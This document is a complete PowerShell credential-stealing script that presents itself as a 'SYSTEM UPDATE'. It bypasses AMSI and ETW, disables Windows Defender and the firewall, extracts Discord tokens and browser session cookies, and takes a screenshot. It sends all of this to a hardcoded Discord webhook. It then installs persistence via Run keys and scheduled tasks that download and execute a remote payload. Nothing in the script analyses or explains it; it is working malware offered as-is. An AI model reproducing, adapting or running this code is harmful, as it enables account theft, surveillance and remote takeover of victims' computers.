# ============================================================
# SYSTEM UPDATE v31.0 (UNIQUE VALID TOKENS + USERNAMES)
# ============================================================

# --- AMSI BYPASS ---
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,1)
} catch {}

try {
    $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
    $d = $c.GetField('amsiEnabled','NonPublic,Static')
    $d.SetValue($null,0)
} catch {}

try {
    $e = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $e.GetField('amsiContext','NonPublic,Static')
    $g = $f.GetValue($null)
    $h = $g.GetType().GetField('_scanner','NonPublic,Instance')
    $h.SetValue($g,$null)
} catch {}

# --- ETW BYPASS ---
try {
    $x = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    $y = $x.GetField('etwEnabled','NonPublic,Static')
    $y.SetValue($null,0)
} catch {}

# --- DISABLE DEFENDER ---
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d 1 /f 2>$null
$null = netsh advfirewall set allprofiles state off 2>$null

# --- WEBHOOK ---
$hook = 'https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD'
$api = 'https://discord.com/api/v9/users/@me'

# --- CHECK WINDOWS ADMIN ---
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$adminStatus = if ($isAdmin) { "YES" } else { "NO" }

# --- REGEX PATTERNS ---
$patterns = @(
    @{ Name = "Standard"; Pattern = '[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}' },
    @{ Name = "MT"; Pattern = 'MT[A-Za-z0-9_-]{20,24}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}' },
    @{ Name = "MFA"; Pattern = 'mfa\.[A-Za-z0-9_-]{84,95}' }
)

# --- FUNCTION: DECODE TOKEN (FULL) ---
function Decode-Token {
    param([string]$token)
    $result = @{
        UserId = $null
        Username = "Unknown"
    }
    try {
        $parts = $token -split '\.'
        if ($parts.Count -ge 1) {
            $p1 = $parts[0]
            $p1 = $p1 -replace '^token=|^auth=|^session='
            while ($p1.Length % 4 -ne 0) { $p1 += "=" }
            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p1))
            
            if ($decoded -match '^\d+$') {
                $result.UserId = $decoded
            } elseif ($decoded -match '(\d{15,20})') {
                $result.UserId = $Matches[1]
            }
            
            if ($decoded -match '"username":"([^"]+)"') {
                $result.Username = $Matches[1]
            } elseif ($decoded -match '"global_name":"([^"]+)"') {
                $result.Username = $Matches[1]
            }
        }
    } catch {}
    return $result
}

# --- FUNCTION: FETCH USERNAME FROM API ---
function Get-Username {
    param([string]$token)
    try {
        $headers = @{
            Authorization = $token
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 10 -ErrorAction Stop
        if ($r.id) {
            return "$($r.username)#$($r.discriminator)"
        }
    } catch {}
    return $null
}

# --- FUNCTION: GET TOKENS ---
function Get-DiscordTokens {
    $tokens = @()
    $seen = @{}
    $paths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discorddevelopment\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
        "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
    )
    
    foreach ($p in $paths) {
        if (Test-Path $p) {
            Get-ChildItem $p -File -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    if ($c) {
                        foreach ($pattern in $patterns) {
                            [regex]::Matches($c, $pattern.Pattern) | ForEach-Object {
                                $token = $_.Value.Trim()
                                $token = $token -replace '^[^A-Za-z0-9_-]+', ''
                                $token = $token -replace '[^A-Za-z0-9_\-\.]+$', ''
                                if ($token.Length -gt 30 -and $token -notin $seen) {
                                    $parts = $token -split '\.'
                                    if ($parts.Count -eq 3) {
                                        $validParts = $true
                                        foreach ($part in $parts) {
                                            if ($part -match '[^A-Za-z0-9_-]') { $validParts = $false; break }
                                            if ($part.Length -lt 5) { $validParts = $false; break }
                                        }
                                        if ($validParts) {
                                            $seen[$token] = $true
                                            $tokens += $token
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $tokens
}

# --- FUNCTION: FILTER TOKENS (UNIQUE ONLY) ---
function FilterTokens {
    param([string[]]$tokens)
    $filtered = @()
    $seenIds = @{}
    
    foreach ($token in $tokens) {
        $decoded = Decode-Token -token $token
        
        if ($decoded.UserId -and $decoded.UserId -notin $seenIds) {
            $seenIds[$decoded.UserId] = $true
            
            $tokenType = "Standard"
            if ($token -match '^mfa\.') { $tokenType = "MFA" }
            elseif ($token -match '^MT') { $tokenType = "MT" }
            
            if ($decoded.Username -eq "Unknown" -or -not $decoded.Username) {
                $decoded.Username = "User $($decoded.UserId)"
            }
            
            $filtered += [PSCustomObject]@{
                Token = $token
                UserId = $decoded.UserId
                Username = $decoded.Username
                Type = $tokenType
                Length = $token.Length
            }
        }
    }
    return $filtered
}

# --- FUNCTION: GET COOKIES ---
function Get-Cookies {
    $cookies = @()
    $seenCookies = @{}
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies",
        "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies",
        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $temp = "$env:TEMP\cookies_$(Get-Random).db"
                Copy-Item $path $temp -Force -ErrorAction SilentlyContinue
                if (Test-Path $temp) {
                    try { Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue } catch {}
                    if ([System.Data.SQLite.SQLiteConnection] -ne $null) {
                        try {
                            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
                            $conn.Open()
                            $cmd = $conn.CreateCommand()
                            $cmd.CommandText = "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%.%' AND (name LIKE '%SID%' OR name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%login%' OR name LIKE '%_ga%' OR name LIKE '%cf_%' OR name LIKE '%__Host%' OR name LIKE '%__Secure%' OR name LIKE '%MUID%' OR name LIKE '%ANONCHK%' OR name LIKE '%dcfduid%') LIMIT 100"
                            $reader = $cmd.ExecuteReader()
                            while ($reader.Read()) {
                                $host = $reader["host_key"].ToString()
                                $name = $reader["name"].ToString()
                                $value = $reader["value"].ToString()
                                if ($value -and $value.Length -gt 2 -and $host -and $name) {
                                    $key = "$host|$name"
                                    if ($key -notin $seenCookies) {
                                        $seenCookies[$key] = $true
                                        $cookies += [PSCustomObject]@{ Host = $host; Name = $name; Value = $value }
                                    }
                                }
                            }
                            $conn.Close()
                        } catch {}
                    }
                    Remove-Item $temp -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        }
    }
    return $cookies
}

# --- FUNCTION: SCREENSHOT ---
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        $screen = [Windows.Forms.Screen]::PrimaryScreen
        $bmp = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $g.Dispose()
        $bmp.Dispose()
        return $bytes
    } catch { return $null }
}

# --- EXECUTE ---
$rawTokens = Get-DiscordTokens
$filteredTokens = FilterTokens -tokens $rawTokens
$cookies = Get-Cookies
$screenshot = Take-Screenshot

# --- FETCH USERNAMES FROM API (ONLY FOR UNIQUE TOKENS) ---
foreach ($t in $filteredTokens) {
    $username = Get-Username -token $t.Token
    if ($username) {
        $t.Username = $username
    }
    Start-Sleep -Milliseconds 300
}

# --- BUILD REPORT ---
$msg = "**[SYSTEM UPDATE]**`n"
$msg += "PC: $env:COMPUTERNAME`n"
$msg += "User: $env:USERNAME`n"
$msg += "Windows Admin: $adminStatus`n"
$msg += "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
$msg += "**RAW TOKENS FOUND:** $($rawTokens.Count)`n"
$msg += "**VALID TOKENS:** $($filteredTokens.Count)`n`n"

if ($filteredTokens.Count -gt 0) {
    $msg += "**✅ VALID TOKENS:**`n`n"
    foreach ($t in $filteredTokens) {
        $msg += "**Username:** $($t.Username)`n"
        $msg += "**User ID:** $($t.UserId)`n"
        $msg += "**Token:** ``$($t.Token)```n"
        $msg += "**Type:** $($t.Type)`n`n"
    }
} else {
    $msg += "**[!] No valid tokens found.**`n"
    if ($rawTokens.Count -gt 0) {
        $msg += "`n**⚠️ ALL RAW TOKENS FOUND:**`n"
        foreach ($t in $rawTokens) {
            $msg += "- ``$t```n"
        }
    }
    $msg += "`n💡 **Tip:** Make sure Discord is running and logged in.`n`n"
}

if ($cookies.Count -gt 0) {
    $msg += "**🍪 COOKIES:** ($($cookies.Count))`n"
    $i = 0
    foreach ($c in $cookies) {
        if ($i -lt 25) {
            $msg += "- $($c.Host) | $($c.Name) | $($c.Value)`n"
        }
        $i++
    }
    if ($cookies.Count -gt 25) {
        $msg += "... and $($cookies.Count - 25) more`n"
    }
} else {
    $msg += "No cookies found.`n"
}

# --- SEND REPORT ---
try {
    Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$msg} -ErrorAction SilentlyContinue
} catch {}

# --- SEND SCREENSHOT ---
if ($screenshot) {
    try {
        $boundary = "----Boundary" + (Get-Random)
        $LF = "`r`n"
        $body = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`; filename=`"screen.png`"$LF" + "Content-Type: image/png$LF$LF"
        $footer = "$LF--$boundary--$LF"
        $h = [Text.Encoding]::ASCII.GetBytes($body)
        $f = [Text.Encoding]::ASCII.GetBytes($footer)
        $req = [Net.WebRequest]::Create($hook)
        $req.Method = "POST"
        $req.ContentType = "multipart/form-data; boundary=$boundary"
        $req.ContentLength = $h.Length + $screenshot.Length + $f.Length
        $s = $req.GetRequestStream()
        $s.Write($h, 0, $h.Length)
        $s.Write($screenshot, 0, $screenshot.Length)
        $s.Write($f, 0, $f.Length)
        $s.Close()
        $req.GetResponse()
    } catch {}
}

# --- PERSISTENCE ---
$cmd = 'powershell.exe -nologo -ep bypass -w hidden -c "IEX(irm ''https://opt.wisp.uno/payload.ps1'')"'

try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue
} catch {}

try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue
} catch {}

try {
    schtasks /create /tn "WindowsUpdate" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
} catch {}

try {
    schtasks /create /tn "MicrosoftEdgeUpdate" /tr "$cmd" /sc onstart /f /rl highest > $null 2>&1
} catch {}

exit
